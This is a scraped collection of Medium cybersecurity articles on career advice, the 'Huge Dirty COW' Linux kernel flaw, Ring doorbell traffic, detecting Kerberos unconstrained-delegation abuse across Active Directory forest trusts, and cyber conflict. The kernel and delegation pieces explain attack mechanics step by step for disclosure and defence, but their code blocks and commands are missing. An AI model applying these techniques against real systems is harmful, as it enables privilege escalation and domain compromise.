As always, I want you to know that some of the links I recommend may pay me a small commission if you decide to make a purchase on a product. It’s not a lot of money (trust me), but it’s important for me to be above board anyway. Most (not all) of the products and services I recommend are those I’ve personally purchased and own myself. I recommend them because it’s what I use and trust. Before recommending products I don’t own, I spend considerable amounts of time researching them first. Are they well-reviewed? What do the individual reviewers say? What do the corporate reviewers say? What do my friends who use the products personally say? All important.
What did I miss? Is there a product or an approach that you think I’ve missed something in my setup? Let me know! Leave a comment or drop me a secure email via ProtonMail.
Written by
","['Privacy', 'How To', 'Cybersecurity', 'Security', 'Digital Transformation']"
How to start a career in cybersecurity? And how to become an expert?,https://medium.com/@AkshaySharmaUS/how-to-start-a-career-in-cybersecurity-and-how-to-become-an-expert-5f8f8e7ce42a?source=tag_archive---------4-----------------------,"UPDATE as of January 19, 2019: Thanks for the overwhelming response! Because of this article and others, I have been consistently receiving high volumes of email inquiries related to career advice. For online training and certifications, check out some useful links below. The links have coupons in them giving you the lowest price! If you need career advice tailored to your specific case, please consider scheduling a LiveCoach session.
It’s the hottest topic featured almost everyday in the news — cyber attacks, security breaches, phishing scams, alleged election hacking, and …the ever increasing demand for qualified professionals. The number of cybersecurity jobs is expected to reach 2 million in 2019. Even though the complaint for “growing demand, and huge skills gap” is being often raised by the employers, don’t let it deter you — I can assure you that it’s good news and the odds are indeed in your favor. Now is the time to start a career in cybersecurity.Even if you don’t consider yourself too technically qualified, that’s okay — cybersecurity has room for everyone and more so for everyone’s growth.
A little background about myself.In short, I had a ton of technical and programming experience before entering Cybersecurity.
Longer version: As someone who was always fascinated by computers and technology, I have been coding since the age of 11 — starting in BASIC, Visual Basic and eventually moving up on the ladder to more sophisticated languages like C/C++, Java, PHP, and Python. I remember my first computer being a leased Windows 95 with a 9"" floppy disk slot — yes, that old. I was always fascinated by the technology powering those graphical dialog boxes, so-called Installation Wizards, webpages, Internet Explorer crashes, and I started fiddling with these artifacts everyday during regular use of my PC. Most of my days were spent developing simple marquee-laden HTML webpages in the now-extinct Microsoft FrontPage. But one of the largest turning points in my programming journey was introduction to Object Oriented Programming (OOP).
OOP basically forms the backbone of most of the programming in the professional world, especially involving large-scale projects. OOP concepts and related subject matter helped me learn the very fundamentals — data structures, classes, algorithms, pointers, memory management, etc. At the time when most of my classmates were planning on what to major for in college, fortunately, the road for me was already paved out: I knew I wanted to be a Software Engineer—I had already been consulting alongside as a web dev. for hire on freelancing platforms and developed my first parental Internet blocker: NetSelect** (see ** below).
Consequently, the title of “computer expert,” had already been conferred upon me by my classmates, high school teachers and of course, my biased friends and family. However, that would be far from accurate and I’ll tell you a little later why.
Fast forward a few years, after excelling in multiple software engineering jobs — backend, front-end; Arduinos, full-stack development, and getting a feel for the field, my knowledge shortly outgrew my interest for development: I finally got it. It’s about learning a new language, tools and techniques, planning, applying the OOP concepts, solving an abstract problem on a whiteboard, collaborating, coding, debugging, and repeating the process every few weeks.
Don’t get me wrong, I still enjoy developing in my spare time; it’s an indispensable skill any technical professional should have, especially as a means to convey your freedom of expression. But, working at a 9 to 5 job as a Developer started to get old and I needed something more challenging. After reading a few pages of Kevin Mitnick and Bruce Schneier, and taking advanced college classes on Networking and Cybersecurity, I decided to jump ship to a related, yet entirely different field of technology.
** For technical geeks out there reading this, my first parental control Internet blocker was a very primitive Visual Basic GUI-based application which made use of the Windows ‘hosts’ file to redirect blocked (e.g. adult, social media, etc.) domain names to Google’s server — simply by remapping the DNS entry for the domain name. The “blocker” gave the parents the ability to add selected domains into a blacklist, which would eventually be printed to the permission-restricted ‘hosts’ file.
For your convenience, the rest of the article has been split into two sections to cater to both newcomers and existing cybersecurity professionals.
After taking a massive dose of hacking books and learning networking concepts, TCP/IP, UDP, Linux, routing, crypto… I was pumped — confident in my knowledge of the fundamentals. I was hoping to find a full-time gig which will finally give me a chance to be a cyber-detective, learn new security technologies, apply my analytic mindset of a developer, and become a beast!And, guess what? I’m still learning.
One thing that intimidates most professionals arriving from non-CS or Engineering backgrounds is their lack of technical knowledge in the cybersecurity space. And, the reason I have mentioned my entire story as a Developer prior to making the bold switch, is to dispute that belief.
Given my background and skillset, I was hoping I would be a star in the cybersecurity space, starting Day 1. Granted I have been the go-to guy in the Development space and someone who had a pretty good grasp on the security concepts, starting in Cybersecurity was a clean-slate experience, even for me!
Before jumping on to the useful tips given below, you should take some time; take a deep breath and truly analyze your interests and goals — what do you see yourself doing as a Cybersecurity Professional? And if so, given your current strengths and weaknesses, what would you change?
If being a real-time detective; an active defender is your thing — for example, breezing through the alerts and phishing emails coming in every few minutes, analyzing the systems, logs, and concluding if it’s just another false alarm or indeed a malicious event in progress, go for a Security Operations Center (SOC) role. If you would rather, passively hunt for intelligence and upcoming threats e.g. by monitoring the news, industry-specific mailing lists, and security advisories, you may be fit for Threat Management. If you are a former Developer-turned-Hacker with a tendency to be curious, fiddle with and “break” things, go for Penetration Testing (aka Cybersecurity Assessments) — although a fair word of warning: a lot of pen-testing jobs turn out to be contractual gigs, rather than full-time roles. Penetration Testing is also an industry with a significant legal liability, due to the potential to cause unintentional damage to the infrastructure or disrupt operations in production environments. It is therefore a smart idea to keep your curiosity under control, unless you can afford to retain an expensive lawyer or to lose your job. ;)
Finally, if would rather stay away from the technical side of things to focus on policymaking, legal compliance, enforcement, and management there’s an entire subset of InfoSec. called Governance, Risk management, and Compliance (GRC) or sometimes, “Security Assurance.” For you this means, being a liaison between the business managers who want their company to be, say, PCI-DSS compliant or HIPAA-compliant, and the technical guys who are going to perform the actual implementation of security controls.And of course, depending on the organization you choose to work for, there may be other uniquely interesting roles which combine the security and developer skillset e.g. reverse engineering, researching, testing, dissecting malware and reviewing vulnerabilities at the source code or assembly level in software.
Thankfully, after much trial-and-error, I have landed my dream-gig: the perfect hybrid between Cybersecurity and Software Development at Sonatype. My day-to-day tasks as a Security Researcher include reverse engineering open source software to carefully hunt for vulnerabilities. As researchers, we are therefore able to provide the critical intelligence that powers our security products, at a much higher precision than solely relying on automation which actually generates a lot of false-positive noise. In this way, I get to apply my Developer skills as well as the Hacker mindset by analyzing open source software code for security flaws.
Now, for someone looking to jump-start their cybersecurity career, here are some useful tips:
The prerequisite to becoming an expert in cybersecurity or in any other field is give up that idea altogether; to stop focusing so much on being an expert and instead shifting your focus towards being a lifelong learner — a student, and a contributor.
With that mindset, before you know it, people will start approaching you as the ‘expert’ on that subject. And as an added bonus, the more you learn, the more you are able to teach, get feedback on and engage in productive, intellectual discussions with other scholars.
Even though I have, on multiple occasions, been referred as an ‘expert’ by technical and non-technical folks alike, I refuse to accept that title because the truth is, I do not know everything and there is no end to knowledge — just look at how fast technology is evolving everyday. There are new programming languages, algorithms, researches, frameworks and not to forget, cyber attacks, appearing everyday. I therefore prefer to be called a learner.Even the Senior-most guy at any organization or that Security expert whose blog you are following, wouldn’t be a know-it-all, either. For most of us, it’s humanly impossible.
Given all that, here are a handful of useful tips that will help you gain expertise in the cybersecurity space or any field:
Once you have applied these concepts in the cybersecurity space, or in whatever you do, before you know it they will start referring to you as an ‘expert’ — although you and I both know to better use the term, ‘learner.’ ;-)
Due to popular demand, I have written Part II of this article geared towards what certifications to get and how to prepare for them:
Written by
","['certification', 'Udemy', 'Cybrary', 'Udacity', 'beginner courses', 'VIP Bundle', 'LinkedIn', 'StackExchange', 'talk', 'Schneier', 'US-CERT', 'DEF CON', 'Blackhat', 'Quora', 'CEH', 'Meetup', 'TEDx', 'Scandal', 'Judy Smith', 'another article', 'Programming', 'Cybersecurity', 'Career Advice', 'Technology', 'Expert']"
“Huge Dirty COW” (CVE-2017–1000405) - Bindecy - Medium,https://medium.com/bindecy/huge-dirty-cow-cve-2017-1000405-110eca132de0?source=tag_archive---------1-----------------------,"The “Dirty COW” vulnerability (CVE-2016–5195) is one of the most hyped and branded vulnerabilities published. Every Linux version from the last decade, including Android, desktops and servers was vulnerable. The impact was vast — millions of users could be compromised easily and reliably, bypassing common exploit defenses.
Plenty of information was published about the vulnerability, but its patch was not analyzed in detail.
We at Bindecy were interested to study the patch and all of its implications. Surprisingly, despite the enormous publicity the bug had received, we discovered that the patch was incomplete.
First, we need a full understanding of the original Dirty COW exploit. We’ll assume basic understanding of the Linux memory manager. We won’t recover the original gory details, as talented people have already done so.
The original vulnerability was in the get_user_pages function. This function is used to get the physical pages behind virtual addresses in user processes. The caller has to specify what kind of actions he intends to perform on these pages (touch, write, lock, etc…), so the memory manager could prepare the pages accordingly. Specifically, when planning to perform a write action on a page inside a private mapping, the page may need to go through a COW (Copy-On-Write) cycle — the original, “read-only” page is copied to a new page which is writable. The original page could be “privileged” — it could be mapped in other processes as well, and might even be written back to the disk after it’s modified.
Let’s now take a look at the relevant code in __get_user_pages:
The while loop’s goal is to fetch each page in the requested page range. Each page has to be faulted in until our requirements are satisfied — that’s what the retry label is used for.
follow_page_mask’s role is to scan the page tables to get the physical page for the given address (while taking into account the PTE permissions), or fail in case the request can’t be satisfied. During follow_page_mask’s operation the PTE’s spinlock is acquired— this guarantees the physical page won’t be released before we grab a reference.
faultin_page requests the memory manager to handle the fault in the given address with the specified permissions (also under the PTE’s spinlock). Note that after a successful call to faultin_page the lock is released — it’s not guaranteed that follow_page_mask will succeed in the next retry; another piece of code might have messed with our page.
The original vulnerable code resided at the end of faultin_page:
The reason for removing theFOLL_WRITE flag is to take into account the case the FOLL_FORCE flag is applied on a read-only VMA (when the VM_MAYWRITE flag is set in the VMA). In that case, the pte_maybe_mkwrite function won’t set the write bit, however the faulted-in page is indeed ready for writing.
If the page went through a COW cycle (marked by the VM_FAULT_WRITE flag) while performing faultin_page and the VMA is not writable, the FOLL_WRITE flag is removed from the next attempt to access the page — only read permissions will be requested.
If the first follow_page_mask fails because the page was read-only or not present, we’ll try to fault it in. Now let’s imagine that during that time, until the next attempt to get the page, we’ll get rid of the COW version (e.g. by using madvise(MADV_DONTNEED)).
The next call to faultin_page will be made without the FOLL_WRITE flag, so we’ll get the read-only version of the page from the page cache. Now, the next call to follow_page_mask will also happen without the FOLL_WRITE flag, so it will return the privileged read-only page — as opposed to the caller’s original request for a writable version of the page.
Basically, the aforementioned flow is the Dirty COW vulnerability — it allows us to write to the read-only privileged version of a page. The following fix was introduced in faultin_page:
And a new function, which is called by follow_page_mask, was added:
Instead of reducing the requested permissions, get_user_pages now remembers the fact the we went through a COW cycle. On the next iteration, we would be able to get a read-only page for a write operation only if the FOLL_FORCE and FOLL_COW flags are specified, and that the PTE is marked as dirty.
This patch assumes that the read-only privileged copy of a page will never have a PTE pointing to it with the dirty bit on — a reasonable assumption… or is it?
Normally, Linux usually uses a 4096-bytes long pages. In order to enable the system to manage large amounts of memory, we can either increase the number of page table entries, or use larger pages. We focus on the second method, which is implemented in Linux by using huge pages.
A huge page is a 2MB long page. One of the ways to utilize this feature is through the Transparent Huge Pages mechanism. While there are other ways to get huge pages, they are outside of our scope.
The kernel will attempt to satisfy relevant memory allocations using huge pages. THP are swappable and “breakable” (i.e. can be split into normal 4096-bytes pages), and can be used in anonymous, shmem and tmpfs mappings (the latter two are true only in newer kernel versions).
Usually (depending on the compilation flags and the machine configuration) the default THP support is for anonymous mapping only. Shmem and tmpfs support can be turned on manually, and in general THP support can be turned on and off while the system is running by writing to some kernel’s special files.
An important optimization opportunity is to coalesce normal pages into huge pages. A special daemon called khugepaged scans constantly for possible candidate pages that could be merged into huge pages. Obviously, to be a candidate, a VMA must cover a whole, aligned 2MB memory range.
THP is implemented by turning on the _PAGE_PSE bit of the PMD (Page Medium Directory, one level above the PTE level). The PMD thus points to a 2MB physical page, instead of a directory of PTEs. Each time the page tables are scanned, the PMDs must be checked with the pmd_trans_huge function, so we can decide whether the PMD points to a pfn or a directory of PTEs. On some architectures, huge PUDs (Page Upper Directory) exist as well, resulting in 1GB pages.
THP is supported since kernel 2.6.38. On most Android devices the THP subsystem is not enabled.
Delving into the Dirty COW patch code that deals with THP, we can see that the same logic of can_follow_write_pte was applied to huge PMDs. A matching function called can_follow_write_pmd was added:
However, in the huge PMD case, a page can be marked dirty without going through a COW cycle, using the touch_pmd function:
This function is reached by follow_page_mask, which will be called each time get_user_pages tries to get a huge page. Obviously, the comment is incorrect and nowadays the dirty bit is NOT meaningless. In particular — when using get_user_pages to read a huge page, that page will be marked dirty without going through a COW cycle, and can_follow_write_pmd’s logic is now broken.
At this point, exploiting the bug is straightforward — we can use a similar pattern of the original Dirty COW race. This time, after we get rid of the copied version of the page, we have to fault the original page twice — first to make it present, and then to turn on the dirty bit.
Now comes the inevitable question — how bad is this?
In order to exploit the bug, we have to choose an interesting read-only huge page as a target for the writing. The only constraint is that we need to be able to fetch it after it’s discarded with madvise(MADV_DONTNEED). Anonymous huge pages that were inherited from a parent process after a fork are a valuable target, however once they are discarded they are lost for good — we can’t fetch them again.
We found two interesting targets that should not be written into:
When issuing a read fault on an anonymous mapping before it was ever written, we get a special physical page called the zero page. This optimization prevents the system from having to allocate multiple zeroed out pages in the system, which might never be written to. Thus, the exact same zero page is mapped in many different processes, which have different security levels.
The same principle applies to huge pages as well — there’s no need to create another huge page if no write fault has occurred yet — a special page called the huge zero page will be mapped, instead. Note that this feature can be turned off as well.
shmem and tmpfs files can be mapped using THP as well. shmem files can be created using the memfd_create syscall, or by mmaping anonymous shared mappings. tmpfs files can be created using the mount point of the tmpfs (usually /dev/shm). Both can be mapped with huge pages, depending on the system configuration.
shmem files can be sealed — sealing a file restricts the set of operations allowed on the file in question. This mechanism allows processes that don’t trust each other to communicate via shared memory without having to take extra measures to deal with unexpected manipulations of the shared memory region (see man memfd_create() for more info). Three types of seals exist -
These seals can be added to the shmem file using the fcntl syscall.
Our POC demonstrates overwriting the huge zero page. Overwriting shmem should be equally possible and would lead to an alternative exploit path.
Note that after the first write page-fault to the zero page, it will be replaced with a new fresh (and zeroed) THP. Using this primitive, we successfully crash several processes. A likely consequence of overwriting the huge zero page is having improper initial values inside large BSS sections. A common vulnerable pattern would be using the zero value as an indicator that a global variable hasn’t been initialized yet.
The following crash example demonstrates that pattern. In this example, the JS Helper thread of Firefox makes a NULL-deref, probably because the boolean pointed by %rdx erroneously says the object was initialized:
This is another crash example — gdb crashes while loading the symbols for a Firefox debugging session:
Link to our POC
This bug demonstrates the importance of patch auditing in the security development life-cycle. As the Dirty COW case and other past cases show, even hyped vulnerabilities may get incomplete patches. The situation is not reserved for closed source software only; open source software suffers just as much.
Feel free to comment with any question or idea about the issue ☺
The initial report was on the 22.11.17 to the kernel and distros mailing lists. The response was immediate and professional with a patch ready in a few days. The patch fixes the touch_pmd function to set the dirty bit of the PMD entry only when the caller asks for write access.
Thanks to the Security team and the distros for their time and effort of maintaining a high standard of security.
22.11.17 — Initial report to security@kernel.org and linux-distros@vs.openwall.org22.11.17 — CVE-2017–1000405 was assigned27.11.17 — Patch was committed to mainline kernel29.11.17 — Public announcement
Written by
","['Programming', 'Cybersecurity', 'Vulnerability', 'Linux', 'Software Development']"
Huge Vulnerability Discovered in the Ring Doorbell - IoT For All - Medium,https://medium.com/iotforall/huge-vulnerability-discovered-in-the-ring-doorbell-f42b492c4d5f?source=tag_archive---------7-----------------------,"Last October, a botnet comprised of ~100,000 Internet of Things (IoT) devices, driven by a virus called Mirai, launched a DDOS attack against Dyn DNS. This attack disrupted service to several major websites including Amazon, PayPal, Twitter, Reddit, and Github.
This attack brought the Mirai Botnet into public light, and with it came very real questions about security in the IoT space. Mirai was able to grow so large so quickly by exploiting default admin passwords on common IoT devices, predominantly video cameras.
A quick look at Google Trends shows that around the time of the Dyn DNS attacks (Oct 21), interest in IoT security registered a huge spike. Since then, talk of IoT security has intensified, not just in how to prevent future botnets, but also in respect to how user data can be protected. However, talk about IoT security only does so much.
So what are we doing in response? In regard to the main component of the Mirai botnet, networked cameras, the concerning answer is that very little has been done. In fact, just this week, it was discovered that the Ring Doorbell, a popular connected camera and security product, is sending data to China.
Why? According to Ring, if the Ring device loses connectivity unexpectedly at the end of a transmission, it sends the final video/audio packets to an un-routable address, essentially throwing them away. Unfortunately for Ring, that isn’t what the device actually does, instead it routes packets to an IP address in China owned by Baidu, a Chinese search engine.
Besides raising serious privacy concerns about what exactly is being sent in the end-of-call packets and who may be receiving them, this behavior creates a potential back-door into the Ring device by opening a hole in the Wi-Fi network the Ring is on, such that data coming back from China can get through a router to the device.
In fact, because the device uses UDP, anyone willing to spoof the Chinese IP Address would be able to return traffic to a Ring Device if they could find it. This could, depending on the firmware of the Ring’s camera, leave it open to command-and-control protocols similar to what happened with the Mirai botnet.
This kind of behavior probably isn’t isolated to just Ring, as most well-known IoT camera devices aren’t actually manufactured by the company selling them. In most cases these devices are actually manufactured overseas by companies like Dahua, Acti, and Hikvision.
This mean that the firmware on the camera often isn’t maintained by the manufacturer. So while consumers may be willing to trust Ring, by using the Ring Doorbell consumers are also unknowingly choosing to trust the manufacturer of the camera.
To further aggravate the problem, Ring might not be able to do anything to address this vulnerability. As mentioned, in all likelihood Ring doesn’t write the firmware on the camera.
In order for the Internet of Things to be secure, every stakeholder from the hardware manufacturer to the service creator has to take security seriously. As we’ve just seen with Ring, even if the customer-facing company cares deeply about security, if the firmware provider doesn’t then it doesn’t matter.
Until everyone takes IoT security seriously, instances like the Mirai Dyn DNS attacks will keep happening with the potential for much darker consequences. Delayed service to websites is one thing, but when the Internet of Things increasingly includes things like medical devices and transportation, the stakes become much higher.
Originally published at iotforall.com
Written by
","['Tech', 'Humans', 'Launch', 'Resources', 'About', 'IoT', 'Technology', 'Cybersecurity', 'Humanity']"
Hunting in Active Directory: Unconstrained Delegation & Forests Trusts,https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1?source=tag_archive---------7-----------------------,"During DerbyCon 2018 this past October, my teammates @tifkin_, @enigma0x3 and @harmj0y gave an awesome presentation titled “The Unintended Risks of Trusting Active Directory”. They demonstrated how an adversary could coerce a domain controller (DC) to authenticate to a server configured with unconstrained delegation, capture the domain controller’s Ticket-Granting-Ticket (TGT), and export the TGT in order to impersonate the DC and perform attacks such as DCSync to request any domain user’s password. For their talk, this use case was presented in the context of one forest with multiple sub-domains; however, recently Will was able to apply the same recipe to compromise DCs on separate foreign forests with a two-way trust set up. I highly recommend you first read Will’s post titled “Not A Security Boundary: Breaking Forest Trusts” since he explains how the attack works from an offensive perspective. He also covers specific configurations that you can apply in your environment to potentially help mitigate the attack.
In this post, I will provide initial detective guidance against the attack variation explained in Will’s post, focusing primarily on security events generated by the forced-machine-account-auth method in general. I will still provide a few specific indicators of compromise (IOCs) collected from Windows security events generated by Rubeus monitoring for TGTs and the execution of the only publicly available proof of concept code SpoolSample (the “printer bug”) developed by Lee Christensen used to force the auth to an unconstrained server. There are still hundreds of RPC servers that have not been analyzed yet like the Printer Server used in the SpoolSample code. Therefore, we cannot assume that an adversary will always use the RPC printer server to execute this attack. In addition, it is important to understand that attacks like this one do not happen in a vacuum. There are other events and actions that might need to happen before, during and after to accomplish the main objective of the operation.
Will provided a lot of information on how the attack works from an offensive perspective in his post. As a defender, it is very important to understand every step taken by the adversary to identify potential data sources that could provide enough information to help on the detection of the attack activity. He quoted “An attacker who compromises a domain controller in a forest (or any server with unconstrained delegation in said forest) can coerce domain controllers in foreign forests to authenticate to the attacker-controlled server through “the printer bug.” Due to various delegation settings, the foreign domain controller’s ticket-granting-ticket (TGT) can be extracted on the attacker-controlled server, reapplied, and used to compromise the credential material in the foreign forest.”
Before we start simulating and documenting the detection of this attack, it is very important to understand what the attacker does and why. In this section, I will provide several of the articles and documentation that helped me understand the attack a little bit better. A few things that stood up for me about the attack from Will’s post were the following:
Simply put, delegation allows a server application to impersonate a client when the server connects to other network resources. According to Microsoft Documentation, Microsoft defines delegation as the action to give authority to a server and allow it to act on behalf of a client with other remote systems in an environment. Servers talking to other servers to perform tasks on behalf of clients is common.
The are three types of Kerberos delegations, and they can be summarized in the table below:
According to Microsoft Docs, when a user requests access to a service (backend server) via a another service (frontend server with unconstrained delegation) the following happens:
The server, with unconstrained delegation configured, can ultimately use the forwarded TGT not only to access other non-requested services in the network, but to execute attacks such as DCSync if it is a Domain Controller TGT. You can read more about the details provided above in here. As you know, the abuse of the unconstrained delegation concept is not new. However, what is very interesting and bad at the same time is that an attacker could also use this technique across foreign forests with a two-way-trust set up. Forest trusts ended up not being security boundaries after all.
More about “Delegation” in general can be also found in the amazing post from Will’s post “Another Word on Delegation”.
Microsoft Docs define trust as a relationship established between domains that enables users in one domain to be authenticated by a domain controller in the other domain. Will also has additional information on domain and forest trusts in his “A Guide to Attacking Domain Trusts” post.
When a new domain is added to the root domain, two-way transitive trusts are created by default.
For the purpose of this post and following on the attack defined in Will’s post, a Forest two-way trust is what we will be dealing with from a defensive perspective. This is very important to understand since there might be Windows Security events that could show us activity between two forests during the attack.
Lee described the printer bug as an old but enabled-by-default method in the Windows Print System Remote Protocol (MS-RPRN) where an adversary with a domain user account can use the MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex) method to force any machine running the Spooler service to authenticate to a target of the attacker’s choice via Kerberos or NTLM.
According to Microsoft Docs, it is based on the Remote Procedure Call (RPC) protocol that supports synchronous printing and spooling operations between a client and server, including print job control and print system management. In addition, the Print System Remote Protocol uses RPC over named pipes only. Therefore, I would expect to see network connections over port 445 between the source and target servers.
It can be used to create a remote change notification object that monitors changes to printer objects and sends change notifications to a print client. An example of this method used in a “Notification of Print System Changes” example can be found here:
Lee’s POC only executes the first 2 methods (RpcOpenPrinter and RpcRemoteFindFirstPrinterChangeNotificationEx) and stops after the notification method returns a nonzero Windows error code. An initial connection between the target (printer server) and the client (unconstrained server) is all it takes for the “printer bug” to work. When the RpcOpenPrinter method is executed, it needs to return an ERROR_SUCCESS value to jump to the notification method which is expected to fail with specific nonzero return values. Lee’s POC monitors for the two following return ERROR values and provides the following messages:
I hope this helped you to have some initial background before running the attack and document the potential data sources that could help us validate the detection of the new technique variation presented by Will.
Two forests with a two-way trust
A compromised forest
A victim forest
Tools
Logging:
Will provided an excellent layout of what the attack might look like in his post. I love this image because it adds some specific details for each step.
From an elevated prompt (cmd.exe) execute the following commands replacing the values according to your servers name setup:
From another prompt (doesn’t have to be elevated):
(You might need to run step 2 again if you do not get anything on your Rubeus Prompt from step 1. I had to run SpoolSample twice since I was not getting anything.
Rubeus should catch the authentication from the Victim Domain Controller and export its TGT.
Account localadmin in hydrogen.covertius.local executes Rubeus, and starts monitoring for 4624 logon events from rikers$ account.
Account localadmin in hydrogen.covertius.local executes the SpoolSample POC, and sets the target server to be rikers.cyberpartners.local and the capture server to be hydrogen.covertius.local. In other words, hydrogen will force rikers to authenticate to it.
Account localadmin in hydrogen.covertius.local requests a Kerberos service ticket with SPN CYBERPARTNERS.LOCAL to connect over to the other forest. Kerberos auth happens because SpoolSample uses the DNS name of the server and not its IP address.
Hydrogen.covertius.local queries the foreign DC rikers.cyberpartners.local via ldap
Hydrogen.covertius.local initiates communication with rikers.cyberpartners.local via port 88 (Kerberos) in order to request a service ticket to access rikers.cyberpartners.local
Rikers.cyberpartners.local receives a Kerberos service ticket request with SPN rikers$ from hydrogen.covertius.local
Account localadmin requests a Kerberos service ticket with SPN krbtgt and ticket options 0x60810010.
Hydrogen.covertius.local starts the communication with rikers.cyberpartners.local over SMB port 445 (Outbound) with the MS-RPRN RpcOpenPrinter method in order to retrieve a printer handle from the “printer server” (rikers).
Rikers.cyberpartners.local receives a successful authentication from hydrogen.covertius.local with account localadmin.
The named pipe share named IPC$ is accessed on rikers.cyberpartners.local by localadmin with domain name covertius in order to bind to the spoolss service.
Account rikers.cyberpartners.local requests a Kerberos service ticket with SPN COVERTIUS.LOCAL to connect back to the compromised forest and authenticate to the server with unconstrained delegation configured (hydrogen.covertius.local). Kerberos auth happens because SpoolSample uses the DNS name of the server and not its IP address.
Rikers.cyberpartners.local queries the hydrogen.covertius.local DC.
Rikers.cyberpartners.local establishes a connection to hydrogen.covertius.local DC via port 88 (Kerberos).
Hydrogen.covertius.local receives a Kerberos service ticket request for SPN hydrogen$ from rikers$
rikers.cyberpartners.local sends a connection back to hydrogen.covertius.local over port 445 as part of the printer bug activity
SID Filtering occurs when riker$ authenticates to the hydrogen.covertius.local since riker$ as any other DC, by default, is part of the well-known enterprise domain controller group (SID Enterprise Domain Controllers (S-1–5–9)). Some extra info: Microsoft Docs.
Account localadmin requests a Kerberos service ticket with SPN krbtgt and ticket options 0x60810010.Due to delegation, we can see how localadmin looks like as if it was coming from 10.7.30.100 (rikers server)
hydrogen.covertius.local receives a successful authentication from rikers.cyberpartners.local with the account rikers$. This confirms that rikers$ was forced to authenticate to our server with unconstrained delegation configured.
Due to delegation, localadmin also successfully logs on to hydrogen DC (itself) but with the source ip value set to the IP address of rikers.
Special privileges are assigned to new logon
The named pipe share named IPC$ is accessed on hydrogen.covertius.local by rikers.cyberpartners.local in order to bind to the spoolss service on the client. Something to point out is that the account accessing the IPC$ is our localadmin from COVERTIUS and not rikers$ (delegation)
Once Rubeus catches the 4624 logon event from rikers$ to Hydrogen, it extracts rikers$ TGT. It first uses a helper that establishes a connection to the LSA server and verifies that the caller is a logon application. If the first step fails, then it could be that the user running rubeus might not have the proper privileges to get a handle to LSA. That’s exactly what happens:
Once it fails, Rubeus uses its own GetSystem function to elevate the local admin account to SYSTEM via token impersonation. Then, it tries again, and it is now able to get a handle to LSA and perform a Kerberos ticket enumeration.
As part of the handle to LSA, Rubeus registers the logon application name “User32LogonProcesss” with 3 “SSS”. The right name is User32LogonProcess and it is an example provided for the LogonProcessName parameter of the LsaRegisterLogonProcess function in Microsoft Docs.
No other events were produced up to this point. What an attack can do next depends on what they want to accomplish with the extracted TGT. This post was mean to document the security events generated during the main steps of the attack presented in Will’s post.
This specific variation of the attack forces Domain Controllers to authenticate to a compromised server with unconstrained delegation configured over a two-way forest trust. Therefore, as we saw in this sequence of events, expect SID filtering events (Security event 4675) on the unconstrained server with filtered SIDs matching Enterprise Domain Controllers (S-1–5–9).
Monitor for successful network logons (Type 3) happening on servers with unconstrained delegation configured coming from Domain Controllers “DCNAME$” that belong to foreign domains across separate forests.
I hope this post was helpful for those that just read about the awesome “Not a Security Boundary: Breaking Forests Trusts” blog post from my teammate Will, and wanted to learn more about most of the data generated at the endpoint level when the attack is executed. This post covered only one endpoint data source. I will be updating this post soon with more endpoint and network data sources to add more context to this attack. Also, what the attacker decides to do with the DC TGT is content for several other posts.
Finally, as I mentioned earlier in the posts, adversarial techniques like this one do not happen in a vacuum. Therefore, you might not catch them by monitoring a few of the recommended events due to the amount of similar activity generated in your specific environment. However, you might catch them while creating a new process and importing the ticket to a new logon session, when executing DCSync, or a number of other ways.
I wanted to thank Will for being patient with me and for answering all the questions I had while writing this post. More updates to the detection approach and variations of the attack will be added soon.
Feedback is greatly appreciated!
https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/
https://msdn.microsoft.com/en-us/library/cc246071.aspx
https://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc775736(v=ws.10)#trust-types-1
https://www.youtube.com/watch?v=-bcWZQCLk_4
https://www.slideshare.net/harmj0y/the-unintended-risks-of-trusting-active-directory
https://msdn.microsoft.com/en-us/library/cc237940.aspx
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc755321(v=ws.10)
https://blogs.technet.microsoft.com/networking/2009/04/28/rpc-to-go-v-3-named-pipes/
https://support.microsoft.com/en-us/help/243330/well-known-security-identifiers-in-windows-operating-systems
https://docs.microsoft.com/en-us/windows/desktop/printdocs/findfirstprinterchangenotification
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759073(v=ws.10)#forests-as-security-boundaries
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc755427(v=ws.10)
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(v=ws.11)
https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/create-global-objects
https://msdn.microsoft.com/en-us/library/cc220234.aspx
https://adsecurity.org/?p=1667
Written by
","['About', 'All Posts', 'specterops.io', 'Rubeus', 'SpoolSample', 'Microsoft', 'Threat Hunting', 'Cybersecurity', 'Data Analytics', 'Data Analysis']"
Idle Thoughts on Cyber - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/idle-thoughts-on-cyber-82170b2b7280?source=tag_archive---------6-----------------------,"Some thought I had while reading an article in The Register based on an interview with Kenneth Geers, ambassador for the NATO Cyber Centre and senior fellow of the Atlantic Council. What follows are just some disjoint idle thoughts.
Firstly, a lot of infrastructure and data is in civilian hands. The people and organizations responsible for securing things are not the ones responsible for retaliating against attacks. They can’t do it anyway because they lack the resources, capability, and legal authority to do so.
As for investing in securing their systems, there is no regulatory requirement to do so. Indeed, for a board of directors, I’ve seen it suggested that they have a fiduciary duty to shareholders not to bear the cost burden of securing critical national infrastructure. It’s not their business to directly bear the costs of defending the nation, that’s what the nation state is for in the first place!
the domain of cyber-warfare, which is particularly fraught because of the fuzzy overlap between outright conflict, cyber-espionage and the responsibility of civilian agencies to protect critical infrastructures (banking, utilities, transport) – most of which is in civilian hands anyway.
Clearly, no one knows how to even conceptualize cyber as a domain. As I phrased it on Twitter:
Hacking takes time. Developing the tool chain takes time, recon takes time, sometimes systems get hardened and the optimal time to hack them was in the past, and so on and so on. The best time to collect intelligence about an adversary is before you need it.
Kenneth Geers, ambassador for the NATO Cyber Centre and senior fellow of the Atlantic Council, explained that an air force could bomb a target overnight but (as evidenced by Stuxnet) you “can’t hack on the same day”.
….You have to decide who, when, how deeply you want to hack… and study networks beforehand,” Geers told El Reg.
“You’d better do a lot of hacking in peace-time [since] you can’t do it overnight,” he added.
